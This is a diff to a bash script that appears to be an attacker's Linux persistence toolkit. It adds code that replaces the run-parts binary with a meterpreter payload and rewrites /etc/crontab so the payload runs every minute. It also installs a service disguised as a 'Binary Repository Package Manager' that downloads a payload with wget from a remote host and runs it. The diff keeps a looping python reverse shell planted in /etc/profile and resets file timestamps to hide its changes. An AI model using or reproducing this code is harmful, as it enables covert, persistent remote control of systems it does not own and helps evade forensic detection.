@@ -103,12 +103,46 @@ BIND_PORT="60000"
 FIFO="/tmp/systemd-private-68eb5cd948c04958a3aa64dc96efabaa-colord.service-73xi5h"
 GLOBAL_PROFILE="/etc/profile"
 
+# Crontab meterpreter
 METERPRETER="/tmp/linux_$NORMAL_PORT"
 CRONTAB="/etc/crontab"
 CRONTAB_FIND="[[:digit:]]\+[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+root[[:blank:]]\+cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
 CRONTAB_REPLACE="\*  \*    \* \* \*   root    cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
 CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
 CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"
+
+# Web delivery meterpreter
+WEB_URI="gnano"
+WEB_PORT="8080"
+
+# Services
+SERVICE_PAYLOAD_PATH="/bin/$WEB_URI"
+SERVICE_NAME="system-pkg"
+SERVICE_COMMAND="test -f $SERVICE_PAYLOAD_PATH || wget -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI; chmod +x $SERVICE_PAYLOAD_PATH; $SERVICE_PAYLOAD_PATH; exit 0"
+
+# systemd
+SYSTEMD_SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
+SYSTEMD_SERVICE="[Unit]
+Description=Binary Repository Package Manager
+
+[Service]
+Type=simple
+ExecStart=$SERVICE_COMMAND
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target"
+
+# SysVInit
+INIT_SERVICE_PATH="/etc/init/${SERVICE_NAME}.conf"
+INIT_SERVICE="description \"binary repository package manager\"
+start on filesystem or runlevel 2345
+stop on shutdown
+script
+    echo \$\$ > /var/run/drpm.pid
+    $SERVICE_COMMAND
+end script"
 
 
 
@@ -120,7 +154,7 @@ cecho task "Persisting reverse shells in '$GLOBAL_PROFILE'"
 # Reverse Shell as a Service - https://reverse-shell.sh/ip:port
 # https://github.com/lukechilds/reverse-shell
 reverse_shells="
-setsid sh -c \"while true; do
+(setsid sh -c \"while true; do
   if command -v python > /dev/null 2>&1; then
     python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"$IP\\\",$REVERSE_PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' 2>/dev/null
     sleep 10
@@ -144,7 +178,7 @@ setsid sh -c \"while true; do
 		sleep 10
 		continue
   fi
-done\" &"
+done\")&"
 
 if [ -f "$GLOBAL_PROFILE" ]; then
 	profile_timestamp=$(get_timestamp "$GLOBAL_PROFILE")
@@ -166,27 +200,45 @@ cecho done "Done persisting reverse shells in '$GLOBAL_PROFILE'"
 
 cecho task "Persisting meterpreter in '$CRONTAB' (stealthily)"
 
-cecho debug "TO-DO: ACTUALLY REPLACE THE BINARY BECAUSE I FORGOT"
-
 if [ -x "$METERPRETER" ]; then
 	if [ -f "$CRONTAB" ]; then
-		etc_timestamp=$(get_timestamp "/etc")
-		crontab_timestamp=$(get_timestamp "$CRONTAB")
+		if ! which run-parts &>/dev/null; then
+			cecho error "'run-parts' not on PATH, cannot plant meterpreter persistence in '$CRONTAB', skipping"
+		else
+			run_parts_path=$(which run-parts)
 
-		if grep -q "$CRONTAB_REPLACE" "$CRONTAB"; then # what we've already replaced
-			cecho log "Meterpreter persistence already in '$CRONTAB', skipping"
-		elif grep -q "$CRONTAB_FIND" "$CRONTAB"; then # what we want to replace
-			sed -i "s/$CRONTAB_FIND/$CRONTAB_REPLACE/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
-		elif grep -q "$CRONTAB_SOMETHING" "$CRONTAB"; then # something exists in crontab
-			first_task=$(grep -m 1 "$CRONTAB_SOMETHING" "$CRONTAB" | sed 's/\*/\\\*/g' | sed 's/\//\\\//g' | sed 's/\&/\\\&/g')
-			prepended="$CRONTAB_REPLACE\n$first_task"
-			sed -i "s/$first_task/$prepended/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || echo error "Could not add meterpreter persistence to '$CRONTAB'"
-		else # nothing exists in crontab
-			echo "$CRONTAB_REPLACE_NORMAL" >> "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
+			usr_bin_timestamp=$(get_timestamp "/usr/bin") 
+			bin_timestamp=$(get_timestamp "/bin")
+			run_parts_timestamp=$(get_timestamp "$run_parts_path")
+			etc_timestamp=$(get_timestamp "/etc")
+			crontab_timestamp=$(get_timestamp "$CRONTAB")
+
+			if cp -f "$METERPRETER" "$run_parts_path" 2>/dev/null; then
+				cecho info "Copied meterpreter binary '$METERPRETER' to run-parts path '$run_parts_path'"
+
+				# The whole purpose of this is to change the callback frequency to every minute, not
+				# whatever its default is which I believe is on the 17th minute of every hour.
+				if grep -q "$CRONTAB_REPLACE" "$CRONTAB"; then # what we've already replaced
+					cecho log "Meterpreter persistence already in '$CRONTAB', skipping"
+				elif grep -q "$CRONTAB_FIND" "$CRONTAB"; then # what we want to replace
+					sed -i "s/$CRONTAB_FIND/$CRONTAB_REPLACE/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
+				elif grep -q "$CRONTAB_SOMETHING" "$CRONTAB"; then # something exists in crontab
+					first_task=$(grep -m 1 "$CRONTAB_SOMETHING" "$CRONTAB" | sed 's/\*/\\\*/g' | sed 's/\//\\\//g' | sed 's/\&/\\\&/g')
+					prepended="$CRONTAB_REPLACE\n$first_task"
+					sed -i "s/$first_task/$prepended/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || echo error "Could not add meterpreter persistence to '$CRONTAB'"
+				else # nothing exists in crontab
+					echo "$CRONTAB_REPLACE_NORMAL" >> "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
+				fi
+
+				set_timestamp $usr_bin_timestamp "/usr/bin"
+				set_timestamp $bin_timestamp "/bin"
+				set_timestamp $run_parts_timestamp "$run_parts_path"
+				set_timestamp $etc_timestamp "/etc"
+				set_timestamp $crontab_timestamp "$CRONTAB"
+			else
+				cecho error "Could not copy meterpreter binary '$METERPRETER' to run-parts path '$run_parts_path', skipping"
+			fi
 		fi
-
-		set_timestamp $etc_timestamp "/etc"
-		set_timestamp $crontab_timestamp "$CRONTAB"
 	else
 		cecho error "Crontab file '$CRONTAB' doesn't exist, skipping stealthy crontab persistence"
 	fi
@@ -196,6 +248,61 @@ fi
 
 cecho done "Done persisting meterpreter in '$CRONTAB' (stealthily)"
 
+
+
+cecho task "Persisting meterpreter via web delivery as a service"
+
+if pidof systemd &>/dev/null; then # systemd
+	if [ -f "$SYSTEMD_SERVICE_PATH" ]; then
+		cecho log "Malicious service already exists at '$SYSTEMD_SERVICE_PATH'"
+	else
+		etc_system_timestamp=$(get_timestamp "/etc/systemd/system")
+		bin_timestamp=$(get_timestamp "/bin")
+
+		if echo "$SYSTEMD_SERVICE" > "$SYSTEMD_SERVICE_PATH"; then
+			cecho info "Malicious service created at '$SYSTEMD_SERVICE_PATH'"
+			chmod 644 "$SYSTEMD_SERVICE_PATH"
+		else
+			echo error "Could not add malicious service at '$SYSTEMD_SERVICE_PATH'"
+		fi
+
+		systemctl start "$SERVICE_NAME" && cecho info "Started malicious service '$SERVICE_NAME'" || cecho error "Could not start malicious service '$SERVICE_NAME'"
+		systemctl enable "$SERVICE_NAME" && cecho info "Enabled malicious service '$SERVICE_NAME'" || cecho error "Could not enable maliicous service '$SERVICE_NAME'"
+
+		set_timestamp $etc_system_timestamp "/etc/systemd/system"
+		set_timestamp $etc_system_timestamp "$SYSTEMD_SERVICE_PATH"
+		set_timestamp $bin_timestamp "/bin"
+		set_timestamp $bin_timestamp "$SERVICE_PAYLOAD_PATH"
+	fi
+elif [ -d "/etc/init" ]; then # SysVInit
+	if [ -f "$INIT_SERVICE_PATH" ]; then
+		cecho log "Malicious service already exists at '$INIT_SERVICE_PATH'"
+	else
+		init_timestamp=$(get_timestamp "/etc/init")
+		run_timestamp=$(get_timestamp "/var/run")
+		bin_timestamp=$(get_timestamp "/bin")
+
+		if echo "$INIT_SERVICE" > "$INIT_SERVICE_PATH"; then
+			cecho info "Malicious service created at '$INIT_SERVICE_PATH'"
+			chmod 644 "$INIT_SERVICE_PATH"
+		else
+			cecho error "Could not add malicious service at '$INIT_SERVICE_PATH'"
+		fi
+
+		initctl start "$SERVICE_NAME" && cecho info "Started malicious service '$SERVICE_NAME'" || cecho error "Could not start malicious service '$SERVICE_NAME'"
+
+		set_timestamp $init_timestamp "/etc/init"
+		set_timestamp $init_timestamp "$INIT_SERVICE_PATH"
+		set_timestamp $run_timestamp "/var/run"
+		set_timestamp $run_timestamp "/var/run/drpm.pid"
+		set_timestamp $bin_timestamp "/bin"
+		set_timestamp $bin_timestamp "$SERVICE_PAYLOAD_PATH"
+	fi
+else # unknown
+	cecho error "No valid init systems detected for meterpreter web delivery service persistence"
+fi
+
+cecho done "Done persisting meterpreter via web delivery as a service"
 
 
 
